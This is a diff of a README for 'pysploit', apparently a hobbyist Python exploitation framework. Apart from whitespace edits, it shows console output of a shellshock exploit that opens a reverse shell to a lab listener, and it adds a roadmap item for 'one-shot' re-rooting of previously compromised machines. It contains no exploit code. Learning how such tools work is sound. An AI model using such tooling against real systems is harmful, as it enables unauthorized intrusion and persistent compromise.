@@ -8,10 +8,10 @@ exercise for me so I learn how things actually work and stop being such a skid.
 
 ```
 $ pysploit.py
-[+]	New session created
-[*]	Starting the network handler
-	[+]	Network handler started successfully!
-[*]	Initializing all the initializables
+[+] New session created
+[*] Starting the network handler
+	[+] Network handler started successfully!
+[*] Initializing all the initializables
 
          ,__________    ,__
         /   __      |  /  /
@@ -22,7 +22,7 @@ $ pysploit.py
 
 $ pysploit> exploit load shellshock
 $ exploit (shellshock)> exploit options
-[~]	Exploit options	[~]
+[~] Exploit options	[~]
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 victim_ip               |		None
 victim_port             |		None
@@ -47,14 +47,14 @@ cgi_path                |		/cgi-bin/status
 payload                 |		None
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 $ exploit (shellshock)> exploit run
-[*]	Checking for vulnerability
-	[*]	Injecting with test nonce 13b64e57dbff4e63b412d40f02ecc933
-	[+]	Received vulnerable output from target!
-	[+]	Target 192.168.56.101 is vulnerable to shellshock
-[*]	Running exploit for shellshock on 192.168.56.101
-	[*]	Shell injection sent (reverse catch at 192.168.56.102:4444)
+[*] Checking for vulnerability
+	[*] Injecting with test nonce 13b64e57dbff4e63b412d40f02ecc933
+	[+] Received vulnerable output from target!
+	[+] Target 192.168.56.101 is vulnerable to shellshock
+[*] Running exploit for shellshock on 192.168.56.101
+	[*] Shell injection sent (reverse catch at 192.168.56.102:4444)
 	[+] Shell caught by listener!
-[+]	Exploitation completed!
+[+] Exploitation completed!
 $ exploit (shellshock)>
 ```
 
@@ -72,3 +72,6 @@ ling, etc.
 * Create some payloads / payload execution frameworks (based off of network module interactions)
 
 * Potentially migrate exploitation into Twisted protocols that are created by the exploits (?)
+
+* Create machine profiles that log and remember successful exploit chains that lead to either user or system
+compromise. Should have the ability to 'one-shot' re-root a logged machine profile by executing a single function.
